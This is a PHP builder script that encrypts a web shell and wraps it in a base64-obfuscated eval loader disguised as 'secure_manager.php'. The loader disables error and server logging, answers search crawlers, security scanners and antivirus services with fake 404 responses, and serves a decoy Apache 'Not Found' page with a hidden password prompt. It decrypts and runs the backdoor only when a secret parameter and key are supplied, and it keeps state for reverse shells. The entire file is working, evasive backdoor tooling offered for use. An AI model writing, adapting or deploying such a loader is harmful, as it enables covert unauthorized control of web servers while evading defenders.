<?php
/**
 * MISSION CRITICAL - RAM-ONLY STEALTH LOADER
 * VERIFIED JSON PERSISTENCE
 */

$source_file    = 'webshell2.php';
$output_name    = 'secure_manager.php';
$encryption_key = '1234shell';
$ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
$ghost_val      = 'SYSTEM32LOGFILEINSTANCE';

$code      = file_get_contents($source_file);
$method    = 'aes-256-gcm';
$iv_len    = openssl_cipher_iv_length($method);
$iv        = openssl_random_pseudo_bytes($iv_len);
$tag       = "";
$encrypted = openssl_encrypt($code, $method, $encryption_key, 0, $iv, $tag);
$payload   = base64_encode($iv . $tag . $encrypted);

// Obfuscated Loader Logic - compatible with PHP 5.6+
$inner_loader = '
@ini_set("session.use_cookies", 0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);
@ini_set("error_log", NULL);
@ini_set("max_execution_time", 0);

if (function_exists("apache_setenv")) { @apache_setenv("dont-log", "1"); @apache_setenv("no-gzip", "1"); }

$ua = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
$bots = array("google", "bot", "crawl", "spider", "slurp", "yahoo", "bing", "archive", "scan", "acunetix", "nessus", "sqlmap", "virustotal", "avast", "kaspersky", "drweb", "shodan", "censys");
foreach($bots as $b) { if(stripos($ua, $b) !== false) { header("HTTP/1.1 404 Not Found"); exit; } }

$suspicious = false;
if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]) && strpos($_SERVER["HTTP_X_FORWARDED_FOR"], "127.0.0.1") !== false) $suspicious = true;
if (extension_loaded("xdebug")) $suspicious = true;
if (isset($_SERVER["HTTP_VIA"])) $suspicious = true;
if ($suspicious) { header("HTTP/1.1 404 Not Found"); exit; }

@header("Cache-Control: no-cache, no-store, must-revalidate");
@header("Pragma: no-cache");
@header("Expires: 0");
@header("X-Content-Type-Options: nosniff");
@header("X-Frame-Options: DENY");

$payload = "' . $payload . '";
$ghost_k = "' . $ghost_key . '";
$ghost_v = "' . $ghost_val . '";

if (!isset($_GET[$ghost_k]) || $_GET[$ghost_k] !== $ghost_v) {
    header("HTTP/1.1 404 Not Found");
    exit;
}

$key = isset($_SERVER["HTTP_X_VAULT_KEY"]) ? $_SERVER["HTTP_X_VAULT_KEY"] : (isset($_COOKIE["v_key"]) ? $_COOKIE["v_key"] : null);

if (!$key) {
    echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server Port 80</address><div style=\"opacity:0;position:absolute;top:0\"><input id=\"p\" type=\"password\" onkeydown=\"if(event.key===\'Enter\')go()\"></div><script>function go(){const k=document.getElementById(\'p\').value;if(!k)return;sessionStorage.setItem(\'v_key\',k);document.cookie=\'v_key=\'+k+\'; path=/; SameSite=Strict\';location.reload()}document.addEventListener(\'keydown\',e=>{if(e.ctrlKey&&e.shiftKey&&e.key===\'K\')document.getElementById(\'p\').parentElement.style.opacity=1});if(sessionStorage.getItem(\'v_key\')){fetch(window.location.href,{headers:{\'X-Vault-Key\':sessionStorage.getItem(\'v_key\')}}).then(r=>r.text()).then(t=>{if(t.indexOf(\'Apache Server\')===-1){document.open();document.write(t);document.close()}else{sessionStorage.removeItem(\'v_key\');document.cookie=\'v_key=; Max-Age=0\';location.reload()}})}</script></body></html>";
    return;
}

$raw = base64_decode($payload);
$method = "aes-256-gcm";
$iv_l = openssl_cipher_iv_length($method);
$iv = substr($raw, 0, $iv_l);
$tag = substr($raw, $iv_l, 16);
$cipher = substr($raw, $iv_l + 16);
$dec = openssl_decrypt($cipher, $method, $key, 0, $iv, $tag);

if ($dec) {
    if (session_status() == PHP_SESSION_NONE) {
        @session_id(md5($key));
        @session_start();
    }
    if (!isset($_SESSION["reverse_shells"])) $_SESSION["reverse_shells"] = array();
    if (isset($_SERVER["HTTP_X_STATE_CWD"]) && $_SERVER["HTTP_X_STATE_CWD"]) $_SESSION["current_dir"] = $_SERVER["HTTP_X_STATE_CWD"];
    if (isset($_SERVER["HTTP_X_STATE_TCWD"]) && $_SERVER["HTTP_X_STATE_TCWD"]) $_SESSION["terminal_cwd"] = $_SERVER["HTTP_X_STATE_TCWD"];

    ob_start();
    unset($payload, $raw, $key, $cipher, $iv);
    eval("?>" . $dec);
    $output = ob_get_clean();

    $is_dl = false;
    foreach(headers_list() as $h) {
        if (stripos($h, "Content-Disposition") !== false || stripos($h, "application/octet-stream") !== false) {
            $is_dl = true; break;
        }
    }

    if (!$is_dl && !(trim($output) && (strpos(trim($output), "{") === 0 || strpos(trim($output), "[") === 0))) {
        echo "<script>(function(){const K=sessionStorage.getItem(\'v_key\');const _f=window.fetch;window.fetch=async(...a)=>{if(!a[1])a[1]={};a[1].headers={...(a[1].headers||{}),\'X-Vault-Key\':K,\'X-Requested-With\':\'XMLHttpRequest\',\'X-State-CWD\':sessionStorage.getItem(\'v_cwd\')||\'\',\'X-State-TCWD\':sessionStorage.getItem(\'v_tcwd\')||\'\'};return _f(...a)}})()</script>" . $output;
    } else { echo $output; }
} else {
    setcookie("v_key", "", time()-3600);
    header("HTTP/1.1 401 Unauthorized");
    return;
}';

function randomString($length = 5) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, $length);
}

$v1 = randomString(6);
$v2 = randomString(6);

$encoded_loader = base64_encode($inner_loader);
$loader_code = '<?php
$' . $v1 . ' = "base" . "64" . "_de" . "code";
$' . $v2 . ' = $' . $v1 . '("' . $encoded_loader . '");
@eval($' . $v2 . ');
?>';

file_put_contents($output_name, $loader_code);
echo "Final Mission Loader: $output_name\n";
